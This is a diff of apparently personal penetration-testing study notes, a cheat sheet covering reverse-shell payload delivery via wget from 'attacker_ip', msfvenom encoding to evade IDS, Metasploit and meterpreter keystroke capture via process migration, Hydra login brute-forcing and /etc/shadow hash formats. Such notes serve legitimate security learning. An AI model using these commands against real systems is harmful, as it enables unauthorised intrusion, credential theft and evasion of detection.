@@ -1,7 +1,7 @@
 LINUX
 	Reverse Shells
 		python3 -m http.server 9000
-			wget http:attacker_ip:9000/file_path to download file to remote pc
+			wget http://attacker_ip:9000/file_path to download file to remote pc
 		./path_to_file to run the .elf file
 	Msfvenom
 		msfvenom (FLAGS) (Options)
@@ -10,6 +10,8 @@ LINUX
 			-p {payload} specifies payload to use
 			-f | specifies format of the payload
 			-e | encodes the payload to avoid IDS and obsfucates
+			-o | outputs to file
+		
 
 	Metasploit
 		msfconsole to enter
@@ -20,7 +22,7 @@ LINUX
 			unset all/payload
 			unsetg xyz
 		info {exploit} or be in exploit and enter info for detailed informations
-		exploit to run the exploit
+		exploit (or run) to run the exploit
 			-z to do it in the background
 			ctrl z or "background" in meterpreter
 		sessions to show background connections
@@ -44,11 +46,12 @@ LINUX
 		migrate {process_id} to migrate to a process (useful for keystroke scan on certain apps like Excel, Word etc...)
 		use "xyz" when refering to paths
 	Hydra
-		hydra (FLAGS) {IP_Address} (FLAGS)
+		hydra (FLAGS) {IP_Address} {service}
 		FLAGS
 			-l <username> sets the user for login
 			-P </Wordlist/path> to set the password wordlist
 			-t xzy sets the threads to spawn
+		service
 			ssh to set SSH login
 
 		sudo hydra -l -p {IP} http-post-form "loginURL:username=^USER^&password=^PASS^:F=incorrect"
@@ -81,8 +84,8 @@ LINUX
 		sha512sum
 			outputs the hash as a hexadecimal
 		
-		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing 			cleartext passwords like Databases do.
-		You can salt hashes by adding a string to the original hash value which changes the hash drastically
+		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing 			cleartext passwords.
+		You can salt hashes by adding a string to the original cleartext before it gets hashed which changes the hash drastically
 		Linux stores these password hashes in /etc/shadow only readable by root. Line contains 9fields seperated by :
 		Password fields are saved in this format $prefix$options$salt$hash			prefix determines the encryption hashing scheme
 
@@ -105,7 +108,7 @@ LINUX
 				-u {URL} to set the target
 				--domain {2nd & 3rd lvl Domain} to set the domain if set with IP
 				--append-domain to add the set domain to every entry to not get false positives
-				--exlude-length x-y to ignore certain status codes that don't interest us
+				--exclude-length x-y to ignore certain status codes that don't interest us
 				-m to set the http method (GET, POST)
 				-r follow redirects
 	NMap
@@ -137,7 +140,7 @@ LINUX
 		cd
 		cat
 		head -n (how many lines)
-		find -Name {file} (can use * for anything)
+		find -name {file} (can use * for anything)
 		grep "string" {file} (-r = recursively thru all files inside a dir)
 			grep -r "string" /dir/
 
@@ -159,11 +162,11 @@ LINUX
 		ip a s
 		sudo tcpdump (FILTERS) (FLAGS)
 		FILTERS
-			host xyz Limit TO & FROM xyz host
-			port xzy Limit TO & FROM xyz port
+			host {IP_Address} Limit TO & FROM {IP_Address} host
+			port {Port} Limit TO & FROM {Port} port
 			src xyz host/port Limit FROM xyz host/port
 			dst xyz host/port Limit TO xyz host/port
-			Protocol xyz Limit to IP, IP6, UDP, TCP, ICMP or ARP
+			Protocol IP, IP6, UDP, TCP, ICMP or ARP | limits the search for this protocol
 	
 			and Captures packets where both conditions are true
 			or Captures packets when either one of the conditions is true
@@ -185,5 +188,7 @@ WINDOWS
 		Get-Command -Name *x*
 		Get-Command -CommandType "x"
 		xyz /?
+		Get-Process
+		Get-Service
 		Get-Item -Path xyz -Stream *
 		Get-FileHash -Path xyz
